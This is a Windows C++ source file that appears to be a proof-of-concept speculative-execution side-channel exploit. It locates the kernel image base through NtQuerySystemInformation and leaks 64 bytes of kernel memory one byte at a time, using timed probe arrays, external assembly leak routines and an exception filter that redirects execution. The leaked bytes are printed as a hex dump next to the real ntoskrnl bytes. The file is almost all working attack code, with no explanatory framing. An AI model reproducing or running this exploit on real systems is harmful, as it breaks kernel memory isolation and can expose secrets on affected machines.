#include "stdafx.h"

#include <gsl/gsl>

extern "C" {
	void* probeArray;
	void* timings;
	void* pointers;
	void* controls;
	extern char _stopspeculate[];
	extern void _leak_branch();
	extern void _leak_exception(void* target);
}

LONG WINAPI exception_filter(_EXCEPTION_POINTERS* ep) noexcept {
	ep->ContextRecord->Rip = reinterpret_cast<DWORD64>(_stopspeculate);
	return EXCEPTION_CONTINUE_EXECUTION;
}

void leak_branch(void*) noexcept {
	_leak_branch();
}

void leak_exception(void* target) noexcept {
	__try {
		_leak_exception(target);
	} __except(exception_filter(GetExceptionInformation())) {
		;
	}
}

std::byte leak(void* target) {
	auto probe_array = std::make_unique<std::byte[]>(0x1000 * 0x100);
	auto timing_array = std::make_unique<std::uint64_t[]>(0x100);
	auto pointers_array = std::make_unique<void*[]>(0x100);
	auto controls_array = std::make_unique<std::uint64_t[]>(0x100);

	for(std::size_t i = 0; i < 0x100; ++i) {
		pointers_array[i] = &pointers_array[0];
		controls_array[i] = 0ui64;
	}
	pointers_array[0xff] = target;
	controls_array[0xff] = 1ui64;

	probeArray = probe_array.get();
	timings = timing_array.get();
	pointers = pointers_array.get();
	controls = controls_array.get();

	leak_branch(target);

	auto it = std::min_element(timing_array.get(), timing_array.get() + 0x100);
	return std::byte{ static_cast<std::uint8_t>(std::distance(it, timing_array.get())) };
}

void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width) {
	auto start = data.begin();
	auto end = data.end();
	auto line = start;
	while(line != end) {
		os.width(4);
		os.fill('0');
		os << std::hex << line - start << ": ";
		const std::ptrdiff_t line_length = std::min(width, end - line);
		for(auto next = line; next != end && next != line + width; ++next) {
			std::uint8_t ch = static_cast<std::uint8_t>(*next);
			os << ((ch < 32 || ch > 127) ? '.' : static_cast<char>(ch));
		}
		if(line_length != width) {
			os << std::string(width - line_length, ' ');
		}
		for(auto next = line; next != end && next != line + width; ++next) {
			std::uint8_t ch = static_cast<std::uint8_t>(*next);
			os << " ";
			os.width(2);
			os.fill('0');
			os << std::hex << std::uppercase << static_cast<int>(ch);
		}
		os << std::endl;
		line = line + line_length;
	}
}

struct RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
};

#pragma warning(push)
#pragma warning(disable: 4200)
struct SYSTEM_MODULE_INFORMATION
{
	ULONG ModulesCount;
	RTL_PROCESS_MODULE_INFORMATION Modules[0];
};
#pragma warning(pop)

struct module_deleter
{
	using pointer = HMODULE;
	void operator()(pointer mod) noexcept {
		::FreeLibrary(mod);
	}
};

int main() {
	decltype(NtQuerySystemInformation)* ntQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation)*>(
	                                                               reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
	std::unique_ptr<std::byte[]> module_info;
	ULONG module_size = 1'024;
	do {
		module_size *= 2;
		module_info = std::make_unique<std::byte[]>(module_size);
	} while(STATUS_SUCCESS != ntQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(11), module_info.get(), module_size, nullptr));

	const SYSTEM_MODULE_INFORMATION* const mi = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>(module_info.get());
	void* const kernel_base = mi->Modules[0].ImageBase;
	const ULONG kernel_size = mi->Modules[0].ImageSize;

	std::unique_ptr<HMODULE, module_deleter> ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
	void* const target = kernel_base;
	const std::uint64_t bytes_to_leak = 64;

	std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
	std::cout << "leaking " << target << std::endl;
	for(DWORD i = 0; i < bytes_to_leak; i++) {
		buffer[i] = leak(static_cast<std::byte*>(target) + i);
	}
	std::cout << "Leaked:" << std::endl;
	hex_dump(gsl::make_span(buffer.get(), bytes_to_leak), std::cout, 16);
	std::cout << "Actual:" << std::endl;
	hex_dump(gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl.get()), bytes_to_leak), std::cout, 16);

	return 0;
}
